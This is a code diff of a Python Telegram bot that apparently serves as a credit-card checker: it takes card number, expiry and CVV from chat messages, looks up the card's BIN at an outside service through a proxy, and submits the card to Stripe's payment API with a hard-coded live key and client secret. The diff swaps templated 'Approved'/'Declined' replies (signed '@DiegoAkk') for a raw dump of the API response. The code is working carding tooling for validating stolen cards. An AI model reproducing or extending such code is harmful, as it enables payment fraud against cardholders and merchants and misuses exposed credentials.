@@ -225,6 +225,22 @@ async def pene(message: types.Message):
     ano = spli[2]
     cvv = spli[3]
 
+
+    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
+    ID = message.from_user.id
+    FIRST = message.from_user.first_name
+    result=apis17['status']
+    banke=apis17['bank']
+    bank=banke['name']
+    brand=apis17['brand']
+    bn=apis17['query']
+    typ=apis17['type']
+    lv=apis17['level']
+    country1=apis17['country']
+    country=country1['name']
+
+    final = time.perf_counter()
+
     dat4 = f'receipt_email=djfjdjffj%40gmail.com&payment_method_data[type]=card&payment_method_data[billing_details][email]=djfjdjffj%40gmail.com&payment_method_data[billing_details][name]=dd&payment_method_data[billing_details][address][postal_code]=10081&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=e97f7c39-c716-4d6f-9bcf-567d84a828419950f7&payment_method_data[muid]=a2e62b85-15c5-4dd1-be12-03b1db1a2396be9b77&payment_method_data[sid]=0c3ac9c2-17e9-43a0-9bba-cb1174e25c5e83d67d&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fed398fe5b%3B+stripe-js-v3%2Fed398fe5b&payment_method_data[time_on_page]=499164&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_DzYuDiszHWOjwN44sVfaT41s&client_secret=pi_3MbaLOJeGhFfMJgC1jwsOBWM_secret_pLuyaWQpQqSY8B7mabt9q0mTY'
 
     headels = {
@@ -256,113 +272,11 @@ async def pene(message: types.Message):
     ko = api201["error"]["code"]
     msgg = api201["error"]["message"]
 
-    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
-    ID = message.from_user.id
-    FIRST = message.from_user.first_name
-    result=apis17['status']
-    banke=apis17['bank']
-    bank=banke['name']
-    brand=apis17['brand']
-    bn=apis17['query']
-    typ=apis17['type']
-    lv=apis17['level']
-    country1=apis17['country']
-    country=country1['name']
-
-    final = time.perf_counter()
+    await message.reply(f"{api201}")
+    
 
 
-    if 'Your card was declined.' in msgg:
-        return await message.reply('''
-<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
-[🝂] 𝐂𝐂: <code>{ccs}</code> 
-[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
-[🝂] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝘄𝗮𝘀 𝗱𝗲𝗰𝗹𝗶𝗻𝗲𝗱.
-—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐁𝐢𝐧: <code>{bn}|{brand}|{typ}|{lv}</code> 
-[Ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code> 
-[Ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: </code>{country}</code> 
-—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
-[Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
-
-
-    if "Your card's security code is invalid." in msgg:
-        return await message.reply('''
-<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
-[🝂] 𝐂𝐂: <code>{ccs}</code> 
-[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
-[🝂] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱'𝘀 𝘀𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗰𝗼𝗱𝗲 𝗶𝘀 𝗶𝗻𝘃𝗮𝗹𝗶𝗱.
-—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐁𝐢𝐧: <code>{bn}|{brand}|{typ}|{lv}</code> 
-[Ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code> 
-[Ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: </code>{country}</code> 
-—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
-[Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
-          
-      
-    if "Your card's expiration year is invalid." in msgg:
-        return await message.reply('''
-<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
-[🝂] 𝐂𝐂: <code>{ccs}</code> 
-[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
-[🝂] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱'𝘀 𝗲𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻 𝘆𝗲𝗮𝗿 𝗶𝘀 𝗶𝗻𝘃𝗮𝗹𝗶𝗱.
-—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐁𝐢𝐧: <code>{bn}|{brand}|{typ}|{lv}</code> 
-[Ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code> 
-[Ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: </code>{country}</code> 
-—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
-[Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
-
-    if 'Your card number is incorrect.' in msgg:
-        return await message.reply('''
-<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
-[🝂] 𝐂𝐂: <code>{ccs}</code> 
-[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
-[🝂] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 𝗶𝘀 𝗶𝗻𝗰𝗼𝗿𝗿𝗲𝗰𝘁.
-—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐁𝐢𝐧: <code>{bn}|{brand}|{typ}|{lv}</code> 
-[Ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code> 
-[Ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: </code>{country}</code> 
-—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
-[Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
-
-    if 'Your card has insufficient funds.' in msgg:
-        return await message.reply('''
-<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
-[🝂] 𝐂𝐂: <code>{ccs}</code> 
-[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
-[🝂] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗵𝗮𝘀 𝗶𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗳𝘂𝗻𝗱𝘀.
-—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐁𝐢𝐧: <code>{bn}|{brand}|{typ}|{lv}</code> 
-[Ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code> 
-[Ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: </code>{country}</code> 
-—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
-[Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
-
-    else:
-        return await message.reply('''
-<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
-[🝂] 𝐂𝐂: <code>{ccs}</code> 
-[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
-[🝂] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝟮𝟱$
-—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐁𝐢𝐧: <code>{bn}|{brand}|{typ}|{lv}</code> 
-[Ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code> 
-[Ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: </code>{country}</code> 
-—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
-[Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
-[Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
+    
         
    
         
